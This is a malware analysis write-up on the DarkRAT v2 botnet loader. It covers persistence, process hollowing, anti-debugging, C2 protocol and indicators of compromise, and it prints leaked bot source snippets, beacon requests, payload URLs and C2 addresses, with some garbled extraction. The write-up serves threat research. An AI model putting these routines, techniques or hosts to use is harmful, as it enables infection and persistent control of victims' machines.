{
    "id": "999cc713-e87f-4fec-aa63-172845a5579d",
    "created_at": "2023-01-12T15:01:33.698943Z",
    "updated_at": "2025-03-27T02:13:34.612049Z",
    "deleted_at": null,
    "sha1_hash": "517856c465b1d0001c38f6e60caa4d0fa2bdc008",
    "title": "2020-01-07 - DarkRat v2.2.0",
    "authors": "",
    "file_creation_date": "2022-05-29T10:49:52Z",
    "file_modification_date": "2022-05-29T10:49:52Z",
    "file_size": 2530228,
    "plain_text": "# DarkRat v2.2.0\n\n**[github.com/albertzsigovits/malware-writeups/blob/master/DarkRATv2/README.md](https://github.com/albertzsigovits/malware-writeups/blob/master/DarkRATv2/README.md)**\n\nalbertzsigovits\n\nmaster\n\n## malware-writeups/DarkRATv2/README.md\n\nCannot retrieve contributors at this time\n\n**Technical synopsis of a C++ Native HTTP Botnet and Loader**\n\nDescription\n\nDarkrat was first found being advertised on HF and is described by the creator as:\n```\n     Darkrat is designed as a HTTP loader, it is coded in C++ with no\n    dependency, the Current bot is design for the Windows API! this means,\n    *DarkRat* has no Cross Platform Support.\n\n```\n\n-----\n\nThis HTTP loader - in reality - acts more like a bot controller.\n\nDisclaimer\n\nThe developer also puts out a small disclaimer in order to avoid potential litigation:\nThis is often seen with other RATs.\n```\nI, the creator, am not responsible for any actions, and or damages, caused by this\nsoftware.\nYou bear the full responsibility of your actions and acknowledge that this software\nwas created for educational purposes only.\nThis software's main purpose is NOT to be used maliciously, or on any system that\nyou do not own, or have the right to use.\nBy using this software, you automatically agree to the above.\nCopyright (c) 2017-2019 DarkSpider\nPermission is hereby granted, free of charge, to any person obtaining a copy of this\nsoftware and associated documentation files (the \"Software\"), to deal in the\nSoftware without restriction, including without limitation the rights to use, copy,\nmodify, merge, publish, distribute, sublicense, and/or sell copies of the Software,\nand to permit persons to whom the Software is furnished to do so, subject to the\nfollowing conditions:\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,\nINCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A\nPARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT\nHOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF\nCONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE\nOR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n\n```\nThen my question is: why is it only advertised on underground cybercrime forums?\n\nThe developer\n\nThe dev uses the moniker `Darkspider on both HF and both in the compiled executables`\npdb path.\nCrawling through Darkspider's posts on HF, there seems to be some clue to his\ngerman/austrian/swiss origin:\n\n\n-----\n\nThe dev is also present on Discord and has a channel where he announced milestones\nregarding his RAT:\n\n\n-----\n\n-----\n\nPricing, forums, seller\n\nDarkspider offers 3 packages that customers can potentially choose from:\n\nBasic/GOLD: unlimited\nSource Version: There is unfortunately only two version available because I can\nnot give any development support (8/10 SOLD)\nPrivate Versions: On Request\n\nThe dev also sells source versions which means DarkRatv2 is potentially being re-selled by\nother individuals too.\n\nRelation to other families\n\nInteresting enough to note that the main description of DarkRAT is basically a copy-paste of\nAbSent-Loader's description. As we will see with the inner workings, clearly, the developer\ntook a lot of ideas and inspiration from both:\n\n[https://github.com/Tlgyt/AbSent-Loader](https://github.com/Tlgyt/AbSent-Loader)\n\n[https://github.com/zettabithf/LiteHTTP](https://github.com/zettabithf/LiteHTTP)\n\nJust recently, a new Botnet was also announced on HF: it has unmistakable ties to\nDarkRATv2. I will try to keep track all of the different 'forks' of DarRAT, since it's really\nfavored in cybercrime rings:\n\nHere's a customized DarkRATv2 panel, called GRS:\n\nAdditional documentation:\n\n\n-----\n\nThe developer maintains a DarkRAT manual on:\n[http://darktools.me/docs/](http://darktools.me/docs/)\n[http://wsyl2u7uvfml6p7p.onion/docs/](http://wsyl2u7uvfml6p7p.onion/docs/)\n\nAlso it's possible to gain additional insights into the workings of the panel by browsing to\nREADME.md on a C2 server:\n\n## Features\n\nPanel\n\nTemplate System based on Smarty\n\nDynamic URL Routing\n\nMulti User Support\n\nPlugin System\n\nStatistics of Bots & online rates\n\nAdvanced Bot Informations\n\nTask Tracking\n\nTask Geo Targeting System\n\nTask Software Targeting System (for .net software)\n\nBot 2.2.0\n\n\n-----\n\nRunning Persistence\nStartup Persistence\nInstalled hidden on the FileSystem\nDownload & Execute\nUpdate\nUninstall\nCustom DLL Loading\nDirect Connect or RAW forwarder (Like pastebin/gist also supported own plain/raw\nsites)\nAV detection\n\nIncluded Plugins\n\nBotshop with autobuy Bitcoin API\nAlpha version of a DDOS (NOT STABLE)\nExamples\n\n## Functionalities\n\nExecution flow\n\nRunning Persistance\n\nCommand: `cmd.exe /k start %APPDATA%\\Microsoft\\Windows\\00jXHoowyD.vbs:`\n```\nDo\nsComputerName = \".\" \nSet objWMIService = GetObject(\"winmgmts:\\\\\" & sComputerName & \"\\root\\cimv2\") \nsQuery = \"SELECT * FROM Win32_Process\" \nSet objItems = objWMIService.ExecQuery(sQuery) \nDim found \nfound = \"false\" \nFor Each objItem In objItems \nIf objItem.Name = \"00jXHoowyD.exe\" Then \nfound = \"true\" \nEnd If \nNext \nIf found = \"false\" Then \nDim objShell \nSet objShell = WScript.CreateObject(\"WScript.Shell\") \nobjShell.Run(\"C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\00jXHoowyD.exe\n > Nul \") \nSet objShell = Nothing \nEnd If \nWScript.Sleep 1000 \nLoop\n\n```\n\n-----\n\nThe vbs file provides periodic checks to ascertain whether the process is running in the\nbackground or not.\n\nStartup Persistance\n\nAPI: `RegSetValueExA`\nKey:\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinSystem32\n\n```\nValue: `C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\00jXHoowyD.exe`\n\nTries to be shady by calling itself WinSystem32.\n\nThe Run key points to the following location on the file system.\n\nLeaked source:\n```\nvoid addstartup()\n{\n     TCHAR path[100];\n     GetModuleFileName(NULL, path, 100);\n     HKEY newValue;\n     RegOpenKey(HKEY_CURRENT_USER,\n\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", &newValue);\n     RegSetValueEx(newValue, \"System32\", 0, REG_SZ, (LPBYTE)path, sizeof(path));\n     RegCloseKey(newValue);\n}\n\n```\nInstalled hidden on the FileSystem\n\n```\n\\AppData\\Roaming\\Microsoft\\Windows\\00jXHoowyD.exe\n\n```\n\nor\n\n```\n\\AppData\\Roaming\\WinBootSystem\\WinBootSystem.exe\n\n```\n\nBeing hidden means the executable is just put into %APPDATA% under the Windows\nfolder.\n\nUninstall\n\n\n-----\n\n```\ncmd.exe /C ping 127.0.0.1 n 1 w 3000 > Nul & Del /f /q %s\n\n```\n\nLeaked source:\n```\nvoid uninstall() {\n     removeRegInstallKey();\n     std::string remove = \" /C \\\"PING.EXE -n 5 127.0.0.1 && del \" + ExePath() +\n\"\\\"\";\n     ShellExecute(\n          NULL,\n          _T(\"open\"),\n          _T(\"cmd\"),\n          _T(remove.c_str()), // params              \n          _T(\" C:\\ \"),\n          SW_HIDE);\n}\n\n```\nAV Detection\n\n```\nwmi with WQL Select * From AntiVirusProduct via root\\SecurityCenter2\n\n```\n\n-----\n\nLeaked source code:\n\n\n-----\n\n```\n      g g () {\n     std::string returnString;\n     CoInitializeEx(0, 0);\n     CoInitializeSecurity(0, -1, 0, 0, 0, 3, 0, 0, 0);\n     IWbemLocator* locator = 0;\n     CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,\nIID_IWbemLocator, (void**)& locator);\n     IWbemServices* services = 0;\n     wchar_t* name = L\"root\\\\SecurityCenter2\";\n     if (SUCCEEDED(locator->ConnectServer(name, 0, 0, 0, 0, 0, 0, &services))) {\n          //printf(\"Connected!\\n\");\n          //Lets get system information\n          CoSetProxyBlanket(services, 10, 0, 0, 3, 3, 0, 0);\n          wchar_t* query = L\"Select * From AntiVirusProduct\";\n          IEnumWbemClassObject* e = 0;\n          if (SUCCEEDED(services->ExecQuery(L\"WQL\", query,\nWBEM_FLAG_FORWARD_ONLY, 0, &e))) {\n              //printf(\"Query executed successfuly!\\n\");\n              IWbemClassObject* object = 0;\n              ULONG u = 0;\n              //lets enumerate all data from this table\n              std::string antiVirus;\n              while (e) {\n                   e->Next(WBEM_INFINITE, 1, &object, &u);\n                   if (!u) break;//no more data,end enumeration\n                   CComVariant cvtVersion;\n                   object->Get(L\"displayName\", 0, &cvtVersion, 0, 0);\n                   //std::wcout << cvtVersion.bstrVal;\n                   returnString = bstr_to_str(cvtVersion.bstrVal);\n              }\n          }\n          else\n              printf(\"Error executing query!\\n\");\n     }\n     else\n          printf(\"Connection error!\\n\");\n     //Close all used data\n     services->Release();\n     locator->Release();\n     CoUninitialize();\n     return returnString;\n}\n\n```\nMutex\n\nAPI: `CreateMutexA`\nValue: `Local\\3mCUq1z`\n\n\n-----\n\nThe mutex value is hardcoded and is different between samples. The call to CreateMutex\nreturns a handle to the mutex '3mCUq1z' in this case.\nNext, GetLastError is called to determine whether the handle points to the same mutex that\nperhaps already existed.\nThen, the code compares the return of the GetLastError call to the hex value 'B7'. 'B7' is the\nsymbolic constant for ERROR_ALREADY_EXISTS.\nIf the mutex already exists, it won't re-infect the system.\n\nLeaked source:\n```\n          //Check if the Bot is Running\n          CreateMutexA(0, FALSE, \"Local\\\\$myprogram$\"); // try to create a\nnamed mutex\n          if (GetLastError() == ERROR_ALREADY_EXISTS) // did the mutex already\nexist?\n              return -1; // quit; mutex is released automatically\n\n```\nCustom DLL Loading\n\n1. `CreateProcessA - dwCreationFlags 4 - CREATE_SUSPENDED`\n2. `VirtualAlloc`\n3. `GetThreadContext`\n4. `ReadProcessMemory`\n5. `GetModuleHandleA - NtUnmapViewofSection`\n6. `GetProcAddress - ntdll.dll`\n7. `VirtualAllocEx`\n8. `WriteProcessMemory`\n9. `SetThreadContext`\n10. `ResumeThread`\n\n11. `VirtualFree`\n\n\n-----\n\n-----\n\nThis method is known as process hollowing. Malware can unmap or hollow out code from\nthe memory of a process, and overwrite the same memory space of the process with\nmalicious code. First, the malware needs to create a new process in suspended mode\n(CreationFlags 4).\n\nNext, the malware swaps out the contents of the benign file with the malicious code. This is\nwhere the call to NtUnmapViewOfSection comes into picture, which is dynamically called\nfrom ntdll.dll to unmap the memory of the target process.\n\nNow that the memory is unmapped, VirtualAllocEx is called to allocate new memory for the\nmalware, and uses WriteProcessMemory to write each of the malware’s sections to the\ntarget process memory space. The malware also calls SetThreadContext to point the\nentrypoint to a new code section.\n\nAs a last step, the malware resumes the suspended thread by calling ResumeThread, so\nthat the process will continues with newly allocated malicious code.\n\nAnti-debugging techniques\n\nIsDebuggerPresent API call\n\n\n-----\n\nCheckRemoteDebuggerPresent API call\n\nmov eax, large fs:30h\n\nThis is used to load the address of the Process Environment Block (PEB), which is\naccessible via the FS segment. The PEB contains a BeingDebugged field which can\nbe read to see if a process is being debugged.\n\nrdtsc\n\nThe RDTSC instruction is used to determine how quickly the processor executes a\nprogram's instructions. It returns the count of the number of ticks since the last system\nreboot as a 64-bit value placed into EDX:EAX. Slowness in the processor's execution\nmight indicate the presence of malware analysis tools, such as a debugger.\n\nQueryPerformanceCounter API call\n\n\n-----\n\nGetTickCount API call\n\nAnti-error technique\n\nDarkRATv2 disables Windows error notifications right at the start of the program.\n\n```\nAPI: SetErrorMode\n\n```\n```\nValue: 0x8007h\n\n```\n\nSEM_FAILCRITICALERRORS\nSEM_NOALIGNMENTFAULTEXCEPT\nSEM_NOOPENFILEERRORBOX\nSEM_NOGPFAULTERRORBOX\n\n## Leaked source code\n\nAn early version of the final Botnet was leaked through the following github repo:\n\nhttps://github.com/Tlgyt/The[Collection/blob/master/Source%20Codes/Botnets/DarkRat%20Loader/derkrut/main.c](https://github.com/Tlgyt/The-Collection/blob/master/Source%20Codes/Botnets/DarkRat%20Loader/derkrut/main.cpp)\npp\n\n\n-----\n\nThe developer desperately tried to get rid of the leaked source by submitting a dispute\nthrough Github:\n\n\n-----\n\nAlso discloses his Discord account:\n\n**Other references**\n\nLeveraging a bit of OSINT, it is also clear that the developer had used lots of resources\nfrom LiteHTTP Botnet. It's clearly a trend: up and coming malware dev take an existing\nmalware as a recipe, add a few modifications here and there and release the new iteration\nas a completely new 'product':\n\nhttps://github.com/darkspiderbots/AbSentLoader/commit/d8e623c682fce9382d771af46463eae7504bc059\nhttps://github.com/darkspiderbots/LiteHTTP/commit/2a29698bba64ef1abb98997e910\n0240dfe37d841\nhttps://github.com/darkspiderbots/LiteHTTP/commit/bf970261e8619d11095102007fb1\nef77b2b84c93\n\n\n-----\n\n**Cryptography**\n\n\n-----\n\nThere s a distinct string in the disassembly of the builder:\n\nIt is also found in the following project: hCrypt, which is an AES encrypted PE Loader:\n\n[https://github.com/Include-sys/hCrypt/blob/master/Stub/main.cpp](https://github.com/Include-sys/hCrypt/blob/master/Stub/main.cpp)\n```\n#include <fstream>\n#include \"VirtualAES\\VirtualAES.h\"\n#include <Windows.h>\n#include <TlHelp32.h>\n/*\n* AES Encrypted and AntiVM PE Loader (Crypter Stub)\n*\n* https://www.github.com/Include-sys/hCrypt\n*\n* Coded by Include-sys for Educational Purposes\n*/\n/* Virtual Machine Detection Functions */\n/*  AES-256 Bit Decryption Function */\nvoid AESDecrypt(char* toDecrypt, int size)\n{\n     //Explanation exist in Builder\n     unsigned char key[KEY_256] = \"S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>\";\n     unsigned char ciphertext[BLOCK_SIZE];\n     unsigned char decrypted[BLOCK_SIZE];\n     aes_ctx_t* ctx;\n     virtualAES::initialize();\n     ctx = virtualAES::allocatectx(key, sizeof(key));\n\n## Panel\n\n```\n\n-----\n\n**Login**\n\n**Dashboard**\n\n\n-----\n\n**Tasks**\n\n\n-----\n\n**Bots**\n\n\n-----\n\n-----\n\n**Settings**\n\n\n-----\n\n-----\n\n[routes](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/routes.png)\n\n**Plugins**\n\n**Panel source**\n\n_../.git/HEAD_ `ref: refs/heads/master`\n\n_../.git/refs/heads/master_ `d53a9090693032825b8a4401e4975e0ffa1d55a5`\n\n_../.git/config_\n\n\n-----\n\n```\n[ ]\n     repositoryformatversion = 0\n     filemode = true\n     bare = false\n     logallrefupdates = true\n[remote \"origin\"]\n     url = https://github.com/darkspiderbots/darkratPanel.git\n     fetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n     remote = origin\n     merge = refs/heads/master\n\n```\n**Source filelist**\n\n_../.git/index_\n\n.htaccess\nREADME.md\nfavicon.ico\nindex.php\nrobots.txt\nversions/2.0/composer.json\nversions/2.0/index.php\nversions/2.0/plugins/about/Controller/aboutConroller.class.php\nversions/2 0/plugins/about/about php\n\n\n-----\n\nversions/2.0/plugins/about/assets/nav/about.svg\nversions/2.0/plugins/about/template/about/about.tpl\nversions/2.0/plugins/custom_urls/Controller/routes.class.php\nversions/2.0/plugins/custom_urls/custom_urls.php\nversions/2.0/plugins/custom_urls/custom_urls.sql\nversions/2.0/plugins/custom_urls/template/settings/options.tpl\nversions/2.0/plugins/ddos/Controller/ddosController.class.php\nversions/2.0/plugins/ddos/Controller/ddosHandlerController.php\nversions/2.0/plugins/ddos/ddos.php\nversions/2.0/plugins/ddos/ddos.sql\nversions/2.0/plugins/ddos/dll/ddoshandle.dll\nversions/2.0/plugins/ddos/template/ddos/ddoshub.tpl\nversions/2.0/plugins/ddos/template/ddos/ddosinfo.tpl\nversions/2.0/plugins/example_task_extension/dll/example.dll\nversions/2.0/plugins/example_task_extension/example_task_extension.php\nversions/2.0/plugins/extreme_onion_routing/Controller/Ajax.class.php\nversions/2.0/plugins/extreme_onion_routing/Controller/Backend.class.php\nversions/2.0/plugins/extreme_onion_routing/Cron/checkServer.php\nversions/2.0/plugins/extreme_onion_routing/extreme_onion_routing.php\nversions/2.0/plugins/extreme_onion_routing/extreme_onion_routing.sql\nversions/2.0/plugins/extreme_onion_routing/template/Backend/extreme_onion_routing.tpl\nversions/2.0/plugins/extreme_onion_routing/template/Backend/manage_gates.tpl\nversions/2.0/plugins/extreme_onion_routing/template/Backend/manage_routers.tpl\nversions/2.0/plugins/logs/Controller/logController.class.php\nversions/2.0/plugins/logs/assets/nav/logs.svg\nversions/2.0/plugins/logs/logs.php\nversions/2.0/plugins/logs/logs.sql\nversions/2.0/plugins/logs/template/log/loginfo.tpl\nversions/2.0/plugins/logs/template/log/logs.tpl\nversions/2.0/plugins/miner/Controller/miner.class.php\nversions/2.0/plugins/miner/dll/Monero_cpu.dll\nversions/2.0/plugins/miner/miner.php\nversions/2.0/plugins/miner/template/miner/settings.tpl\nversions/2.0/plugins/stealer/Controller/PassMain.class.php\nversions/2.0/plugins/stealer/Controller/Recovery.class.php\nversions/2.0/plugins/stealer/dll/Stealer.dll\nversions/2.0/plugins/stealer/stealer.php\nversions/2.0/plugins/stealer/stealer.sql\nversions/2.0/plugins/stealer/template/passmain/cookiemanager.tpl\nversions/2.0/plugins/stealer/template/passmain/passrecovery.tpl\nversions/2.0/vendor/autoload.php\n...\n\n_Full list:_ _[https://pastebin.com/A3WYH5C5](https://pastebin.com/A3WYH5C5)_\n\n## C2 communication\n\n_#1 Pastebin grab_\n\n\n-----\n\n```\n       p\nAccept: text/plain\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46\n(KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3\nHost: pastebin.com\n\n```\n_#2 Bot check-in request_\n```\nPOST /request HTTP/1.1\nAccept: text/plain\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: SUq1rx\nHost: 37.44.215.132\nContent-Length: 656\nrequest=YUhkcFpEMHhOR0V6T0RKbE1TMDBZVEl3TFRWbU4yTXRZak5pTkMwMllXRmtOVEl3TW1Fd01XVW1ZM\n\n```\n_#3 Admin login page_\n```\nPOST /login HTTP/1.1\nHost: advcash.network\nUser-Agent: Mozilla/5.0 (X11; Linux i686; rv:99.0) Gecko/20100101 Firefox/99.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://advcash.network/login\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 24\nCookie: PHPSESSID=abcdefghijklmnopq012345678\nConnection: close\nUpgrade-Insecure-Requests: 1\nuserid=USER&pswrd=PASSWORD\n\n## Hiding C2 addresses\n\n```\nInitially the C2 server address is hidden from your eyes. The developer had implemented a\nlayered approach into how a certain sample is deciding which C2 server it connects to.\n\n\n-----\n\n1. There s a pastebin link in plain text embedded in the sample\n2. There's also a decryption key in plain text in the sample\n3. Sample gets pastebin link, content is generally a base64 encoded string\n4. Decoding the base64 string reveals a binary blob\n5. Then the binary blob gets decrypted with the initial key and then the plain-text is the\n\nC2 address\n\n**Pastebin and key relations**\n\n**Pastebin** **RC4 private key**\n\n3CC2ryd2 DE4E24E3E9DEF1F54C1816AC26C18\n\nJ7vpbEz6 28BED2E43A51F81DB74F9318BA1F1A1F\n\nmuEbW4SF tMJJl1hIGXmbDZOQP3bUf4xI1Mj97OQa\n\nNdUjPC1w wzXnjDj3i0pLHGhZJGMAkAdKLCpCDygH\n\nQq0sfw23 1YqsiIPGf3mCzRuKqo46ZohUKeZFzTDH\n\nRCw33291 pZ2bEq15zrxIecBpXGR1TqjTSrvOgJiq\n\nwAEXNbVF 9C7BF1FECCE2AA3AA2F424178FD7\n\nWeThNNxK 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN3\n\nEusfX8PQ no sample\n\nDPXyyALg no crypt key\n\nm2h5tLBG 65s8fe8484sf6es8f4\n\nvy8c6ZYT tMJJl1hIGXmbDZOQP3bUf4xI1Mj97OQa\n\ni1wTNE8w no crypt key\n\nH5UZsfyw Sx4UDJ3HAlxNCiy1Xmvj8L8n84iqiFcr\n\ndNqyCpKw KouYwnCjHFjJcACwDTLiVW0tinMYVqxi\n\nHemhJqcW 5POeBkhLRpl6NfFkxavzAYAhHVi5AD5E\n\nR40x8Ax1 LnqWwGjc3WIioIDbEQUUVHfuVNCgxSI1\n\nMmBK5bMH KP9JHafuX8LZlfXe7r58vK8IxRhULkND\n\nEznTvkbq GHyufDShu65hgduFGd98igfdp56hJugodf2\n\n - agO2mW7VAEV2wxPHaU6FqIu18ZOvOkIC\n\n - G29kZBPCKtzCc0IEWGNFssjPfFIoKasv\n\nXh46Jxgb gNRyjhyuPpRc63DQIGtCMO6WXDRKxIft\n\npt3fxyTg FA27B3E1FE89C2FC184158616C51E/td>\n\nFYN0sb2Z 9DFF1BB88566612A34154A5A9D15F8\n\n\n-----\n\n## Indicators of Compromise\n\n**DarkRatv2 versions**\n\n1.1.0\n2.0.1\n2.1.3\n2.2.0\n\n**Phpmyadmin versions**\n\n4.5.4.1\n4.6.6deb5\n\n**Git repository**\n\n[https://github.com/darkspiderbots/darkratPanel.git](https://github.com/darkspiderbots/darkratPanel.git)\n\n**Dev pastebin**\n\n[https://pastebin.com/u/darkspiderbots](https://pastebin.com/u/darkspiderbots)\n\n**Developer contacts**\n\nXMPP: [darkspider@xmpp.jp](http://10.10.0.46/mailto:darkspider@xmpp.jp)\n\nEmail: [darkspiderbots@protonmail.com](http://10.10.0.46/mailto:darkspiderbots@protonmail.com)\n\nEmail: [darkspider@exploit.im](http://10.10.0.46/mailto:darkspider@exploit.im)\n\nGithub: github.com/darkspiderbots\n\nSite: darktools.me\n\nSite: darktools.pro\n\n**DarkRATv2 builder**\n\nSHA256: 27396fe2ff38df7e3b9d67c1112ea6cd7ede1a8e56507cca5aa0a446eb7f4143\nPDB: C:\\Users\\darkspider\\Desktop\\DarkRatCoding\\darkrat\\bot\\Release\\Builder.pdb\nLicense file: darkrat.lic\nGate settings: config.json\nPanel package: Panel.zip\n\n\n-----\n\n**Builder settings**\n\nek = Encryption key\npu = Pastebin URL or Direct Encrypted URL\nmux = Mutex\nsup = Startup true/false\nri = Request Interval in seconds\npre = Running persistance true/false\nst = Spread tag\nua = User-Agent\npn = Some Example for DarkRat Developers\n```\n{\n     \"ek\": \"randomkey\",\n     \"pu\": \"http://pastebin.com/raw/randomuri\",\n     \"mux\": \"randommutex\",\n     \"sup\": \"false\",\n     \"ri\": \"5\",\n     \"pre\": \"false\",\n     \"st\": \"main\",\n     \"ua\": \"randomua\",\n     \"pn\": { \"FOO\":\"BAR\"}\n}\n\n```\n**ITW and payloads**\n\n\n-----\n\n5.2.77.232/forum/files/taskhost.exe\n35.222.227.120/haru.exe\n38.37.44.215.132/bin.exe\n46.45.81.148.141/dashboard/t.exe\n94.140.114.180/file.exe\n107.175.64.210/guc.exe\n138.68.15.227/drcrypt.exe\n138.68.217.234/crypted.exe\n185.35.138.22/nice/nice.exe\n185.222.202.218/guc.exe\n198.23.202.49/guc.exe\nadvcash.network/bin.exe\nadvclash.online/main.exe\ncmailserv19fd.world/guc.exe\ncsdstat14tp.world/guc.exe\ndarktools.me/demon.exe\ndarktools.me/mamasita12.exe\ndarktools.me/talkwithdevil.exe\ngayahu.com/p/upload/hvnc.exe\nhomeless.helpingourfuture.org.uk/trrr/test.exe\nmicrosoftpairingservice.biz/csrss.exe\nmicrosoftpairingservice.biz/darkrat/csrss.exe\nmicrosofttimingservice.biz/darkrat/csrss.exe\nmailadvert8231dx.world/hvnc.exe\nmailserv964k.world/spread.exe\nmailadvert8231dx.world/guc.exe\nrubthemoneybear.xyz/lucky/dark.exe\nsdstat9624tp.world/guc.exe\nsecuritylabs.me/samcrypt1.exe\nsecuritylabs.me/update.exe\nstarserver1274km.world/guc.exe\nzadvexmail19mn.world/guc.exe\nzmailserv19fd.world/guc.exe\nzsdstat14tp.world/guc.exe\n\n**C2 servers**\n\n\n-----\n\n5.8.88.111/request\n35.223.22.225/request\n35.224.116.196/request\n37.44.215.132/request\n45.118.134.105/request\n89.47.162.126/request\n89.47.167.155/request\n94.140.114.180/request\n104.223.20.200/request\n104.244.75.179/request\n138.68.15.227/request\n138.68.217.234/request\n149.28.67.170/request\n157.230.218.78/request\n167.114.95.127/request\n178.62.183.205/request\n178.62.187.103/request\n178.62.189.202/request\n185.130.215.184/request\n185.193.38.158/request\n185.234.72.246/request\n192.154.224.113/request\nadvcash.network/request\nadvertstar777.world/request\nadvclash.online/request\nbotnumdns.godbuntu.net/request\ncactuscooler.space/request\ngameclash.online/request\ngodbuntu.net/request\nlinuxpro.icu/request\nhighzebra.cash/request\nmicrosoftpairityservice.biz/request\nmicrosoftsyncservice.biz/request\nplasticfantastic.pw/request\nroulette39.club/request\nruneliteplus.xyz/request\nsecuritylabs.me/request\ntuu.nu/request\nweloverocknroll.online/request\nxyro.xyz/request\n\n**C2 server resources**\n\n../.git\n../bots\n../dashboard\n../ddos\n../edituser/1\n../login\n../phpmyadmin\n\n\n-----\n\n../request\n../settings\n../stealer\n../tasks\n../versions/2.0/plugins/stealer/stealer.sql\n../versions/2.0/plugins/hvnc/dll/hvnc.dll\n../versions/2.0/templates/v2/install/index.tpl\n\n**Plugins**\n\ncustom_urls\nddos\nhvnc\nminer\nstealer\n\n**C2 beacon parameters (before double base64 encoding)**\n\nhwid=12a345b6-1a23-1a2b-a1b2-1abc2345d67e\n\n&computername=TEST-PC\n\n&aornot=true\n\n&installedRam=2.000000\n\n&netFramework2=true\n\n&netFramework3=true\n\n&netFramework35=true\n\n&netFramework4=true\n\n&antivirus=\n\n&botversion=2.1.3\n\n&gpuName=todo\n\n&cpuName=Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz\n\n&arch=x64\n\n&operingsystem=Windows 7 Service Pack 1\n\n&spreadtag=main\n\n**Hardcoded User-Agents**\n\nUser-Agent: 1FD931B7\nUser-Agent: BCC26\nUser-Agent: bDZbUf\nUser-Agent: rvOgJiq\nUser-Agent: SUq1rx\nUser-Agent: t7AwFzx\nUser-Agent: dIrPpqdynH\nUser-Agent: gate\nUser-Agent: SenukeDR102\nUser-Agent: bDZOQP3\nUser-Agent: EznTvkbq\nUser-Agent: 971643fc85\nUser-Agent: Frisb_bott\nUser-Agent: thisisdumb\nUser-Agent: XDRKxIft\n\n\n-----\n\nUser-Agent: update2\nUser-Agent: testbot\nUser-Agent: testbot777\nUser-Agent: hLRpl6N\nUser-Agent: agent\nUser-Agent: paliwa\nUser-Agent: dark\nUser-Agent: ACwDTLiV\nUser-Agent: qoptv\nUser-Agent: test111\nUser-Agent: somesecret\nUser-Agent: somesecret111\nUser-Agent: somesecret222\nUser-Agent: buzrcHcgjv\nUser-Agent: ranx\nUser-Agent: OQ6VI91O344QD7TJGWWF\n\n**Hardcoded Mutexes**\n\nLocal\\muEbW4SF\nLocal\\RCw33291\nLocal\\1RCw3329\nLocal\\Qq0sfw23\nLocal\\EznTvkbq\nLocal\\3CC2ryd2\nLocal\\3mCUq1z\nLocal\\8jCPd9d\nLocal\\eWjMV\nLocal\\DvzjZ\nLocal\\VvSVp\nLocal\\PSBQv\nLocal\\hkrrI\nLocal\\EgMJa\nLocal\\ViZWD\nLocal\\YhxUy\nLocal\\fWySU\nLocal\\ujBPF\nLocal\\dLjaI\nLocal\\LnOtv\nLocal\\qxMBo\nLocal\\GTQAG\nLocal\\YUMMY\nLocal\\kCHLu\nLocal\\GBqea\nLocal\\qreaO\nLocal\\eWjMV\nLocal\\ejZbw\nLocal\\mLBas\nLocal\\gFvHS\nLocal\\dtrps\n\n\n-----\n\nLocal\\UeXeS\nLocal\\tGlfz\nLocal\\qawsedc\nLocal\\mutextest\nLocal\\qwertqewyt\nLocal$myprogram$\n\n**Suspicious API calls**\n\nCheckRemoteDebuggerPresent\nCreateProcess\nCreateThread\nCreateToolhelp32Snapshot\nGetCurrentProcess\nGetProcAddress\nGetThreadContext\nGetTickCount\nGetModuleHandle\nIsDebuggerPresent\nLoadLibrary\nNtUnmapViewOfSection\nOpenProcess\nProcess32First\nProcess32Next\nReadProcessMemory\nResumeThread\nSetThreadContext\nShellExecuteA\nURLOpenBlockingStreamA\nVirtualAlloc\nVirtualFree\nVirtualProtect\nWriteProcessMemory\n\n**PDBs**\n\nC:\\Users\\darkspider\\source\\repos\\darkrat_hiddendesktop\\Release\\Client.pdb\nC:\\Users\\darkspider\\source\\repos\\DarkRat2.0.1\\Release\\DarkRat2.0.1.pdb\nC:\\Users\\darkspider\\source\\repos\\melt\\Release\\melt.pdb\nC:\\Users\\darkspider\\Desktop\\DarkRatCoding\\darkrat\\bot\\Release\\test.pdb\nC:\\Users\\darkspider\\Desktop\\DarkRatCoding\\darkrat\\bot\\Release\\Builder.pdb\nC:\\Users\\darkspider\\Desktop\\DarkRat Coding\\darkrat\\bot\\Debug\\test.pdb\nC:\\Users\\darkspider\\Desktop\\TinyNuke-master\\Bin\\int32.pdb\nC:\\Users\\darkspider\\Desktop\\TinyNuke-master\\Bin\\int64.pdb\nC:\\Users\\user\\Documents\\darkrat_coding\\bot\\Release\\test.pdb\nC:\\Users\\timl8\\Desktop\\DarkRat2\\darkrat-master\\test\\Release\\test.pdb\nD:\\High-End\\darkrat-master_Bot-17-6-2019\\darkrat-master\\bot\\Release\\test.pdb\nD:\\High-End\\darkrat-master-2-6-2019\\darkrat-master\\bot\\Release\\test.pdb\nC:\\Users\\RIG\\Desktop\\VB.NET\\hf\\DArkRAt 